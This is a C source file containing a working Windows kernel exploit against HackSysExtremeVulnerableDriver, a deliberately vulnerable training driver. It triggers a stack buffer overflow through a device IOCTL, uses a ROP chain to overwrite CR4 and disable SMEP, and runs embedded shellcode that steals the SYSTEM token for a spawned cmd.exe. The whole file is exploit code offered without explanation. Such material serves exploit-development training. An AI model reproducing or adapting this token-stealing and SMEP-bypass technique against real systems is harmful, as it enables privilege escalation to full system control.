#include<Windows.h>
#include<stdio.h>
#include "KernelBase.h"

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define BOF_IOCTL 0x222003

unsigned long long* payload, * cursor, krnlBase = 0, payloadLen = 0x818, HEVDBase = 0;

#define _BUFFER_SIZE 256
char shellcode[_BUFFER_SIZE] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x83, 0xb8, 0x40, 0x04,
  0x00, 0x00, 0x04, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x48, 0x04,
  0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0xeb, 0xe8,
  0x48, 0x89, 0xc6, 0x81, 0xb8, 0x40, 0x04, 0x00, 0x00, 0x41,
  0x41, 0x41, 0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x48, 0x04,
  0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0xeb, 0xe5,
  0x48, 0x89, 0xc7, 0x48, 0x8b, 0x86, 0xb8, 0x04, 0x00, 0x00,
  0x48, 0x89, 0x87, 0xb8, 0x04, 0x00, 0x00, 0x4c, 0x89, 0xd9,
  0x48, 0x81, 0xe9, 0x00, 0x08, 0x00, 0x00, 0x4c, 0x89, 0xdc,
  0x48, 0xbe, 0xbb, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00,
  0x48, 0xc7, 0xc7, 0x4d, 0x00, 0x00, 0x00, 0x58, 0x58, 0x58,
  0x48, 0xb8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x48, 0x89, 0x04, 0x24, 0x48, 0x31, 0xc0, 0xc3, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

void add(unsigned long long g) {
	*cursor = g;
	cursor++;
	payloadLen += 8;
}

void ROP() {
	add(krnlBase + 0x207451);//0x0000000000207451 : pop rcx ; ret

	add(0x2506f8);

	add(krnlBase + 0x39ff77);//0x000000000039ff77 : mov cr4, rcx ; ret

	add(shellcode);
}

DWORD execCmd() {
	STARTUPINFO si = { 0, };
	PROCESS_INFORMATION pi = { 0, };

	si.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, 1, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("Process Creation Failed\n");
		return 0;
	}

	return pi.dwProcessId;
}

int main() {
	HANDLE driver;

	payloadLen = 0x818;

	//krnlBase = (unsigned long long) getKernelBase("\\SystemRoot\\system32\\ntoskrnl.exe");
	//HEVDBase = (unsigned long long) getKernelBase("\\??\\C:\\HEVD.3.00\\driver\\vulnerable\\x64\\HEVD.sys");
	krnlBase = (unsigned long long) getKernelBase("ntoskrnl");
	HEVDBase = (unsigned long long) getKernelBase("HEVD");
	printf("%llx, %llx\n", krnlBase, HEVDBase);

	unsigned long long ret = HEVDBase + 0x865AE;

	payload = (unsigned long long*)malloc(0x1000);

	memset(payload, 0x0, 0x818);

	cursor = payload;
	cursor += 0x818/0x8;

	ROP();

	*((DWORD*)(shellcode + 49)) = execCmd();
	*((unsigned long long*)(shellcode + 122)) = ret;

	driver = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (driver == INVALID_HANDLE_VALUE) {
		return 0;
	}

	printf("Get Handle\n");

	DWORD oldProt;
	if (!VirtualProtect(shellcode, _BUFFER_SIZE, PAGE_EXECUTE_READWRITE, &oldProt)) printf("VirtualProtect Failed\n");

	printf("%llx\n", payloadLen);

	DeviceIoControl(driver, BOF_IOCTL, payload, payloadLen, NULL, 0, NULL, NULL);

	CloseHandle(driver);

	free(payload);
}